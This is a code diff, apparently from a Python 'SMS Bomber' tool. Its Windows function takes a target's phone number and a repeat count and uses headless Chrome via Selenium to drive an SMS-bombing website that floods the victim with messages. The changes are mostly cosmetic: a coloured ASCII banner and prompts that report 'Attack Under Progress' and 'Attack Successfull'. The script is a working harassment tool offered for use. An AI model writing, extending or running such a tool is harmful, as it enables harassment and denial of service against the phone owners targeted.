@@ -6,56 +6,65 @@ def smsbombingwin():
     from selenium.webdriver.support import expected_conditions as EC
     from selenium.webdriver.chrome.options import Options
     from selenium.webdriver.support.ui import Select
-    import platform
-    from about import menu,about
+    from simple_chalk import chalk
     import time
     import os
 
-    
+    os.system('cls')
+
+    eascii = """ 
+     $$$$$$\  $$\      $$\  $$$$$$\        $$$$$$$\                          $$\                           
+    $$  __$$\ $$$\    $$$ |$$  __$$\       $$  __$$\                         $$ |                          
+    $$ /  \__|$$$$\  $$$$ |$$ /  \__|      $$ |  $$ | $$$$$$\  $$$$$$\$$$$\  $$$$$$$\   $$$$$$\   $$$$$$\  
+    \$$$$$$\  $$\$$\$$ $$ |\$$$$$$\        $$$$$$$\ |$$  __$$\ $$  _$$  _$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
+     \____$$\ $$ \$$$  $$ | \____$$\       $$  __$$\ $$ /  $$ |$$ / $$ / $$ |$$ |  $$ |$$$$$$$$ |$$ |  \__|
+    $$\   $$ |$$ |\$  /$$ |$$\   $$ |      $$ |  $$ |$$ |  $$ |$$ | $$ | $$ |$$ |  $$ |$$   ____|$$ |      
+    \$$$$$$  |$$ | \_/ $$ |\$$$$$$  |      $$$$$$$  |\$$$$$$  |$$ | $$ | $$ |$$$$$$$  |\$$$$$$$\ $$ |      
+     \______/ \__|     \__| \______/       \_______/  \______/ \__| \__| \__|\_______/  \_______|\__|  
+"""
+
+    print(chalk.green.bold(eascii))
     def remsp(num):
         num = num.replace(' ', '')
         num = num.replace('-', '')
         return num
 
-    cc = input("    |-$ Enter Your Country Code (Without +) > ")
-    ph = input('    |-$ Enter Target Number > ' + " +" + cc + " ")
+    cc = input(chalk.green("[1] ----> Enter Your Country Code (Without +): "))
+    ph = input(chalk.red('[2] ----> Enter Target Number: ' + " +" + cc + " "))
 
     ph = remsp(ph)
 
     if len(cc) >= 4 or len(cc) < 1:
-        print('    |-$ Invalid Country Code.. Country Codes Are Generally 1-3 digits...')
+        print(chalk.red.bold('[-] Invalid Country Code.. Country Codes Are Generally 1-3 digits...'))
         return
 
     if len(ph) <= 6:
-        print('    |-$ Invalid Phone Number..')
+        print(chalk.red.bold('[-] Invalid Phone Number..'))
         return
 
     for cch in str(cc + ph):
         if not cch.isdigit():
-            print('    |-$ Phone Number Must Consist Of Numbers Only')
+            print(chalk.red.bold('[-] Phone Number Must Consist Of Numbers Only'))
             return
 
-    repcount = int(input('    |-$ How many times (1-200) ? > '))
+    repcount = int(input('[3] ----> How many times (1-200) ? : '))
 
     options = Options()
     options.headless = True
     options.add_argument("--log-level=3")
 
-    wcr_dict = os.getcwd() + '//chromedriver.exe'
+    wcr_dict = os.getcwd() + '\chromedriver.exe'
+
+    print(chalk.green("[+] Chrome Driver Path Found = ",wcr_dict))
 
     browser = webdriver.Chrome(executable_path=wcr_dict, chrome_options=options)
 
-    os.system('cls')
-    about()
-    menu()
-    print(f'''    |-> 2
-    |-$ Enter Your Country Code (Without +) > {cc}
-    |-$ Enter Target Number > +{cc} {ph}''')
-
-    print(
-f'''    |-$ How many times (1-200) ? > {repcount}''')
+    print("\n\n")
     
-    print("    |-$ Attack Under Progress (Don't Close The Terminal) !")
+    print(chalk.green(f'[1] ----> Enter Your Country Code (Without +): {cc}'))
+    print(chalk.green(f'[2] ----> Enter Target Number: +{cc} {ph}'))
+    print(chalk.green(f'[3] ----> How many times (1-200) ? : {repcount}'))
+    print(chalk.red(f'[4] ----> Attack Under Progress (Don\'t Close The Terminal) !'))
 
     if cc == '91':
         browser.get('https://mytoolstown.com/smsbomber/#bestsmsbomber')
@@ -81,7 +90,7 @@ f'''    |-$ How many times (1-200) ? > {repcount}''')
         try:
             select.select_by_value(cc)
         except:
-            print('    |-$ invalid country code !')
+            print(chalk.red.bold('[-] Invalid Country Code !'))
             return
         finally:
             pass
@@ -107,9 +116,7 @@ f'''    |-$ How many times (1-200) ? > {repcount}''')
         time.sleep(5)
 
 
-    print(
-'''    |-} Done !
-    |-----------------------------------------------------------''')
+    print(chalk.green.bold('[+] Attack Successfull !'))
     time.sleep(2)
     browser.quit()
 def smsbombinglinux():
